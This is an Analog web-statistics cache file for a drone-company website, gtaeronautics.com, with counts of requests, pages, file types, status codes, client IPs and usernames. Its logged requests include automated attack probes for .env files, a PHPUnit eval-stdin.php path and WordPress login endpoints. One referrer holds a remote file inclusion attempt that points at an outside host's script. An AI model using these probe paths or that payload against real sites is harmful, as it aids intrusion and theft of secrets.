x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2022	05	08	05	44
x	FR	2007	12	18	17	05
x	LR	2022	05	06	23	56
x	E7	2022	05	08	05	44
x	SR	1038749
x	S7	1385
x	NC	410094
x	C7	0
x	FL	421598
x	F7	347
x	RR	187
x	R7	0
x	NH	92124
x	H7	284
x	BT	42782494721
x	B7	154076101
1	Rr	28085	2.704	2022
1	Rr	98917	9.523	2021
1	Rr	89380	8.605	2020
1	Rr	80088	7.710	2019
1	Rr	68927	6.636	2018
1	Rr	60168	5.792	2017
1	Rr	73316	7.058	2016
1	Rr	80796	7.778	2015
1	Rr	110773	10.664	2014
1	Rr	65173	6.274	2013
1	Rr	60742	5.848	2012
1	Rr	57015	5.489	2011
1	Rr	22139	2.131	2010
1	Rr	69710	6.711	2009
1	Rr	71820	6.914	2008
1	Rr	1700	0.164	2007
1	*BT	R	110773	2014
r	lRSc	1	1394	17	0.867	/gt100hl+rpas.html
r	lRSc	1	22469	17	1.299	/uasfc.html
r	lRSc	1	9276	17	0.967	/sru.html
r	lRSc	1	27480	15	44.119	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	17743	15	0.740	/cfmt.html
r	lRSc	1	6061	15	0.829	/gt1500+rpas.html
r	lRSc	1	14964	14	0.893	/links.html
r	lRSc	1	13149	14	0.912	/faq.html
r	lRSc	1	5696	13	0.623	/gt50t+rpas.html
r	lRSc	1	6013	12	0.572	/gt380+rpas.html
r	lRSc	1	18356	12	0.916	/consultinga.html
r	lRSc	1	14331	12	0.384	/pna.html
r	lRSc	1	9955	12	0.763	/rd.html
r	lRSc	1	15871	10	0.320	/employment.html
r	lRSc	1	31	5	5.157	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	21	5	1.013	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	29	5	7.441	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	18	5	7.121	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	21	3	5.464	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	3814	1	0.063	/banditomav.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	979	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	4124	0	0.000	/uavengines.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	3928	0	0.000	/gtatexan.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	3709	0	0.000	/bandituas.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	220677	36.258	.jpg  [JPEG graphics]
t	lRb	1	317306	34.068	.html [Hypertext Markup Language]
t	lRb	1	247169	21.376	[directories]
t	lRb	1	778	2.900	.wmv
t	lRb	1	87	2.847	.mpg  [MPEG movie]
t	lRb	1	18734	1.225	.asp  [Active Server REQUESTS]
t	lRb	1	59555	0.380	.gif  [GIF graphics]
t	lRb	1	103842	0.316	.js  [JavaScript code]
t	lRb	1	54223	0.279	.css  [Cascading Style Sheets]
t	lRb	1	55	0.189	.mp4
t	lRb	1	16323	0.162	[not listed: 7]
z	*FR	2009	06	30	04	42
z	*LR	2022	05	06	23	56
z	ScR	111	0.000	78909	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	55	0.006	81643	101b-  1kb
z	ScR	444	1.354	474569	1kb- 10kb
z	ScR	266	4.881	332212	10kb-100kb
z	ScR	477	57.741	69345	100kb-  1Mb
z	ScR	32	36.018	2028	1Mb- 10Mb
z	ScR	0	0.000	43	10Mb-100Mb
c	*FR	2014	03	02	13	52
c	*LR	2022	05	06	23	56
c	*f	0R	a
c	R	955637	200 OK
c	R	6989	206 Partial content
c	R	110	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	76123	304 Not modified since last retrieval
c	R	755	400 Bad request
c	R	207	401 Authentication required
c	R	202	403 Access forbidden
c	R	418073	404 Document not found
c	R	1050	405 Method not allowed
c	R	477	406 Document not acceptable to client
c	R	89	416 Requested range not valid
c	R	617	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2022	05	06	23	26
I	*f	-30S	s
I	lRS	1	102323	120	/robots.txt
I	lRS	1	823	18	/.env
I	lRS	1	1174	15	/
I	lRS	1	3297	14	/ads.txt
I	lRS	1	274	14	/vendor/phpunit/phpunit/src/util/php/eval-stdin.php
I	lRS	1	2131	13	/xmlrpc.php
I	lRS	1	6351	10	/wp-login.php
I	lRS	1	829	6	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	862	4	/sitemap.xml
I	lRS	1	139	4	/mobile-app
I	lRS	1	698	4	/wordpress/
I	lRS	1	11	4	/sitemap
I	lRS	1	141	3	/android
I	lRS	1	136	3	/ios
I	lRS	1	1739	3	/plus/mytag_js.php
I	lRS	1	162	3	/data/admin/ver.txt
I	lRS	1	136	3	/downloads
I	lRS	1	24	3	/uploads/userup/
I	lRS	1	32	3	/sitemap.txt
I	lRS	1	432	2	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	416	2	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	315	2	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	589	2	/wp-includes/wlwmanifest.xml
I	lRS	1	178	2	/mobile
I	lRS	1	17497	2	/]louis
I	lRS	1	436	2	/web/wp-includes/wlwmanifest.xml
I	lRS	1	430	2	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	857	2	/">louis
I	lRS	1	576	2	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	432	2	/website/wp-includes/wlwmanifest.xml
I	lRS	1	278152	78	[not listed: 22514]
L	*FR	2007	12	11	00	52
L	*LR	2022	05	06	23	26
L	*f	-20S	s
L	RS	63	36	210.16.102.195
L	RS	18	18	182.16.248.210
L	RS	18	18	164.92.113.127
L	RS	17	17	51.75.232.246
L	RS	1653	11	216.244.66.229
L	RS	18	9	192.253.238.66
L	RS	233	9	157.90.182.26
L	RS	53	7	66.249.64.66
L	RS	6	6	34.216.142.175
L	RS	163	6	66.249.64.94
L	RS	5	5	121.204.132.153
L	RS	5	5	62.197.136.102
L	RS	5	5	35.205.135.47
L	RS	28	5	40.77.167.97
L	RS	44	4	66.249.64.68
L	RS	4	4	34.74.124.201
L	RS	12	4	20.115.128.142
L	RS	4	4	211.205.155.42
L	RS	133	4	108.59.8.80
L	RS	48	3	194.38.20.161
L	RS	419068	167	[not listed: 76922]
K	*FR	2013	12	22	04	20
K	*LR	2022	05	05	19	55
K	*f	-30S	s
K	lRS	1	921	4	http://gtaeronautics.com/
K	lRS	1	185	2	http://www.gtaeronautics.com/BANDITOMAV.html
K	lRS	1	20784	2	http://www.gtaeronautics.com/
K	lRS	1	3	1	http://www.gtaeronautics.com/m/d/txt/test.txt
K	lRS	1	29926	0	[not listed: 4903]
E	*FR	2008	01	06	10	12
E	*LR	2022	04	19	22	19
E	*f	-30S	s
E	lSR	1	0	187	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2022	04	19	22	19
l	*f	-20S	s
l	SR	0	187	[not listed: 104]
v	*f	-20B	b
v	Rb	381334	53.082	64.41.87.40
v	Rb	657415	46.918	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2022	04	19	22	19
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	9	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2022	05	06	23	26
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	118992	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2022	03	10	19	59
P	*LR	2022	05	06	23	56
P	R	56	0
P	R	0	<= 0.01
P	R	696	0.01-0.02
P	R	31574	0.02-0.05
P	R	70867	0.05-0.1 
P	R	87704	0.1 -0.2 
P	R	89326	0.2 -0.5 
P	R	44439	0.5 -1   
P	R	25395	1-  2 
P	R	11316	2-  5 
P	R	6896	5- 10 
P	R	2975	10- 20 
P	R	9020	20- 60 
P	R	866	60-120 
P	R	179	120-300 
